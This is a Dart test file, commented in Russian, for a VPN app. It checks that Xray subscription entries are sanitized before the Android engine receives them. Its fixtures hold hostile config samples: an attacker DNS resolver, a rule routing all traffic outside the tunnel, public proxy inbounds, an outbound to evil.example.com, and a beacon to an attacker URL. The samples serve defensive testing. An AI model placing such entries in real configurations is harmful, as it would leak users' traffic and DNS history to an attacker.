// Конфиг, который приложение отдаёт движку на Android.
//
// Здесь проверяются два свойства. Первое: это ЗАПИСЬ подписки, а не собранный нами заново
// конфиг — собственная сборка (все узлы + балансировщик + обсерватория + метрики) внутри
// системного VpnService поднимала туннель, но трафик через него не шёл, тогда как та же
// подписка в стороннем клиенте работала. Второе: запись САНИТИЗОВАНА (аудит, HIGH) — из неё
// вырезаны чужие секции управления движком (dns/routing/log/metrics/…), входы только
// локальные socks на 127.0.0.1 (http-вход записи выбрасывается — чужой порт это
// неаутентифицированный локальный прокси), исходы direct/block безусловно заменены
// нашими freedom/blackhole, а dns/routing подложены наши. Порт socks-входа
// перезаписывается: его ищет плагин.
//
// Образец подписки снят с живой выдачи (uuid и адреса обезличены; адреса — хостнеймы в
// доверенных доменах, т.к. гейт подписки сырые IP не пропускает) и содержит узел через CDN,
// прямой узел и служебную запись-балансировщик.
import 'dart:convert';
import 'dart:io';
import 'package:flutter_test/flutter_test.dart';
import 'package:bitaps_vpn/singbox_config.dart';
import 'package:bitaps_vpn/xray_config.dart';

void main() {
  final body = File('test/fixtures/subscription-live.json').readAsStringSync();
  final parsed = parseSubscription(body);

  test('узлы разобраны, запись-балансировщик пропущена', () {
    expect(parsed.nodes.length, 2, reason: 'должны остаться узел через CDN и прямой');
    expect(parsed.nodes.any((n) => n.remark.contains('Авто')), isFalse);
    // каждый узел несёт ЦЕЛУЮ запись подписки — иначе Android нечего отдать движку
    for (final n in parsed.nodes) {
      expect(n.full, isNotNull, reason: 'у узла «${n.remark}» потерян исходный конфиг записи');
    }
  });

  for (final idx in [0, 1]) {
    test('конфиг для Android — это запись подписки (узел ${idx + 1})', () {
      final n = parsed.nodes[idx];
      final cfg = json.decode(xrayEntryConfigJson(n, socksPort: 10808)) as Map<String, dynamic>;

      // ровно три исхода записи: сам узел, прямой выход и «в никуда»
      final tags = (cfg['outbounds'] as List).map((o) => (o as Map)['tag']).toList();
      expect(tags, ['proxy', 'direct', 'block'],
          reason: 'исходы должны быть как в подписке, а не наши node-N');

      // никаких наших надстроек: именно они и не пережили чужой VpnService
      expect(cfg.containsKey('observatory'), isFalse);
      expect(cfg.containsKey('metrics'), isFalse);
      expect((cfg['routing'] as Map).containsKey('balancers'), isFalse);
      expect(cfg.containsKey('remarks'), isFalse, reason: 'служебное поле подписки движку не нужно');

      // порт socks-входа подменён: по нему плагин направляет перехваченный трафик
      final inb = (cfg['inbounds'] as List).cast<Map>();
      final socks = inb.firstWhere((i) => i['protocol'] == 'socks');
      expect(socks['port'], 10808);

      // адрес узла на месте — иначе подключаться некуда
      final vnext = ((cfg['outbounds'] as List).first as Map)['settings']['vnext'] as List;
      expect((vnext.first as Map)['address'], n.server);
      expect((vnext.first as Map)['port'], n.port);
    });
  }

  test('локальный вход НЕ на 10808 — этот порт занимают другие клиенты', () {
    // 10808 — порт по умолчанию у Happ и v2rayNG. Пока такой клиент стоит на телефоне, порт
    // занят, движок не может открыть вход, и туннель поднимается пустым: система показывает
    // VPN, а трафика нет. Порт обязан быть своим.
    expect(kXrayAndroidSocksPort, isNot(10808));
    final cfg = json.decode(
        xrayEntryConfigJson(parsed.nodes.first, socksPort: kXrayAndroidSocksPort)) as Map<String, dynamic>;
    final socks = (cfg['inbounds'] as List).cast<Map>().firstWhere((i) => i['protocol'] == 'socks');
    expect(socks['port'], kXrayAndroidSocksPort);
  });

  test('узел через CDN сохраняет транспорт xhttp', () {
    final cdn = parsed.nodes.firstWhere((n) => n.remark.contains('LTE'));
    final cfg = json.decode(xrayEntryConfigJson(cdn)) as Map<String, dynamic>;
    final ss = ((cfg['outbounds'] as List).first as Map)['streamSettings'] as Map;
    expect(ss['network'], 'xhttp', reason: 'без xhttp узел белого списка не поднимется');
    expect(ss['xhttpSettings'], isNotNull);
  });

  // Вредоносная запись: публичные входы, резолвер атакующего, freedom-даунгрейд и чужие
  // секции управления движком. Всё это раньше уходило движку verbatim (аудит, HIGH).
  Map<String, dynamic> evilEntry() => <String, dynamic>{
        'remarks': '🇫🇮 Финляндия',
        'log': {'loglevel': 'debug'},
        'dns': {
          'servers': ['1.2.3.4'], // резолвер атакующего: вся история резолвов ему
        },
        'routing': {
          // freedom-даунгрейд: весь трафик мимо туннеля, человек думает, что защищён
          'rules': [
            {'type': 'field', 'network': 'tcp,udp', 'outboundTag': 'direct'},
          ],
        },
        'metrics': {'listen': '0.0.0.0:11111'},
        'policy': {'system': {'statsOutboundUplink': true}},
        'stats': <String, dynamic>{},
        'api': {'tag': 'api'},
        'reverse': {'bridges': []},
        'fakedns': [],
        'observatory': <String, dynamic>{},
        'transport': <String, dynamic>{},
        'inbounds': [
          // публичный SOCKS на устройстве — бесплатный прокси для всей локальной сети
          {'listen': '0.0.0.0', 'port': 1080, 'protocol': 'socks'},
          // http-вход с чужим портом — неаутентифицированный локальный прокси через VPN
          // для любого приложения на телефоне: выбрасываем целиком (аудит, LOW)
          {'listen': '0.0.0.0', 'port': 8080, 'protocol': 'http'},
          // не-socks вход вообще выбрасываем
          {'listen': '0.0.0.0', 'port': 5353, 'protocol': 'dokodemo-door', 'settings': {'address': '8.8.8.8'}},
        ],
        'outbounds': [
          {
            'tag': 'proxy',
            'protocol': 'vless',
            'settings': {
              'vnext': [
                {
                  'address': 'fi1.bitapsvpn.com',
                  'port': 443,
                  'users': [
                    {'id': '11111111-2222-3333-4444-555555555555', 'encryption': 'none'},
                  ],
                },
              ],
            },
            'streamSettings': {'network': 'tcp'},
          },
        ],
      };

  SubNode evilNode([Map<String, dynamic>? entry]) {
    final e = entry ?? evilEntry();
    return SubNode(
      remark: '🇫🇮 Финляндия',
      tag: '🇫🇮 Финляндия',
      server: 'fi1.bitapsvpn.com',
      port: 443,
      xray: (e['outbounds'] as List).first as Map<String, dynamic>,
      full: e,
    );
  }

  test('вредоносная запись санитизуется перед отдачей движку', () {
    final cfg = json.decode(xrayEntryConfigJson(evilNode(), socksPort: 10836)) as Map<String, dynamic>;

    // чужие секции управления движком вырезаны
    for (final s in ['log', 'metrics', 'policy', 'stats', 'api', 'reverse', 'fakedns', 'observatory', 'transport']) {
      expect(cfg.containsKey(s), isFalse, reason: 'секция $s не должна попасть к движку');
    }
    expect(cfg.containsKey('remarks'), isFalse, reason: 'служебное поле подписки движку не нужно');

    // dns — НАШ (DoH), не резолвер атакующего
    final dnsServers = ((cfg['dns'] as Map)['servers'] as List).join('|');
    expect(dnsServers, isNot(contains('1.2.3.4')));
    expect(dnsServers, contains('dns-query'));

    // routing — НАШ: маршрут по умолчанию в туннель, а не freedom-даунгрейд
    final rulesJson = json.encode((cfg['routing'] as Map)['rules']);
    expect(rulesJson, contains('"outboundTag":"proxy"'));

    // входы: только socks и только на 127.0.0.1; порт socks перезаписан как раньше.
    // http-вход записи выброшен целиком (аудит, LOW): чужой порт — неаутентифицированный
    // локальный прокси через VPN, а плагину нужен только socks.
    final inbounds = (cfg['inbounds'] as List).cast<Map>();
    expect(inbounds.length, 1, reason: 'http и dokodemo-door обязаны быть выброшены');
    for (final i in inbounds) {
      expect(i['listen'], '127.0.0.1', reason: 'публичный listen — это открытый прокси на устройстве');
      expect(i['protocol'], 'socks');
    }
    expect(inbounds.first['port'], 10836);

    // сам узел не тронут — иначе подключаться стало бы не к тому серверу
    final vnext = ((cfg['outbounds'] as List).first as Map)['settings']['vnext'] as List;
    expect((vnext.first as Map)['address'], 'fi1.bitapsvpn.com');
  });

  test('запись без входов и без direct/block достраивается нашими, а не ломается', () {
    final entry = evilEntry()
      ..remove('inbounds')
      ..remove('outbounds');
    entry['outbounds'] = (evilEntry()['outbounds'] as List).take(1).toList(); // только proxy
    final node = SubNode(
      remark: 'x', tag: 'x', server: 'fi1.bitapsvpn.com', port: 443,
      xray: (entry['outbounds'] as List).first as Map<String, dynamic>,
      full: entry,
    );
    final cfg = json.decode(xrayEntryConfigJson(node, socksPort: 10836)) as Map<String, dynamic>;

    // socks-вход обязан появиться: плагин ищет его в конфиге
    final inbounds = (cfg['inbounds'] as List).cast<Map>();
    final socks = inbounds.singleWhere((i) => i['protocol'] == 'socks');
    expect(socks['listen'], '127.0.0.1');
    expect(socks['port'], 10836);

    // наши правила ссылаются на direct/block — они гарантированно есть, иначе движок не стартует
    final tags = (cfg['outbounds'] as List).map((o) => (o as Map)['tag']).toList();
    expect(tags, containsAll(['proxy', 'direct', 'block']));
  });

  test('ADV-1: чужие direct/block заменяются нашими freedom/blackhole, evil-хост не доходит', () {
    // Запись подкладывает СВОЙ исход под тегом direct: наши правила шлют в этот тег
    // geosite:category-ru/private, geoip:ru/private и bittorrent — без безусловной замены
    // это молчаливый MITM RU-трафика (аудит, HIGH). Тег block подменён на freedom —
    // «заблокированная» реклама уходила бы напрямую.
    final entry = evilEntry();
    entry['outbounds'] = [
      (evilEntry()['outbounds'] as List).first, // настоящий прокси-исход записи
      {
        'tag': 'direct',
        'protocol': 'vless',
        'settings': {
          'vnext': [
            {
              'address': 'evil.example.com',
              'port': 443,
              'users': [
                {'id': '11111111-2222-3333-4444-555555555555', 'encryption': 'none'},
              ],
            },
          ],
        },
      },
      {'tag': 'block', 'protocol': 'freedom'},
    ];
    final cfg =
        json.decode(xrayEntryConfigJson(evilNode(entry), socksPort: 10836)) as Map<String, dynamic>;

    final outbounds = (cfg['outbounds'] as List).cast<Map>();
    expect(outbounds.map((o) => o['tag']).toList(), ['proxy', 'direct', 'block'],
        reason: 'прокси-исход записи сохраняется, чужие direct/block выброшены');
    expect(outbounds.singleWhere((o) => o['tag'] == 'direct')['protocol'], 'freedom',
        reason: 'direct обязан быть нашим freedom, а не vless атакующего');
    expect(outbounds.singleWhere((o) => o['tag'] == 'block')['protocol'], 'blackhole');
    // evil-хост не должен попасть в финальный конфиг ни в каком виде
    expect(json.encode(cfg), isNot(contains('evil.example.com')));
    // цель правил — настоящий прокси-исход записи, а не выброшенный исход
    expect(json.encode((cfg['routing'] as Map)['rules']), contains('"outboundTag":"proxy"'));
  });

  test('ADV-2: burstObservatory записи вырезается (маячок атакующему)', () {
    // У движка ДВЕ обсерватории: observatory уже вырезалась, а burstObservatory — нет,
    // и движок исполнял чужой pingConfig: регулярные пробы на URL атакующего (аудит, LOW).
    final entry = evilEntry()
      ..['burstObservatory'] = {
        'pingConfig': {'destination': 'https://evil.example.com/beacon', 'interval': '1m'},
        'subjectSelector': ['proxy'],
      };
    final cfg =
        json.decode(xrayEntryConfigJson(evilNode(entry), socksPort: 10836)) as Map<String, dynamic>;
    expect(cfg.containsKey('burstObservatory'), isFalse);
    expect(cfg.containsKey('observatory'), isFalse);
    expect(json.encode(cfg), isNot(contains('evil.example.com')));
  });
}
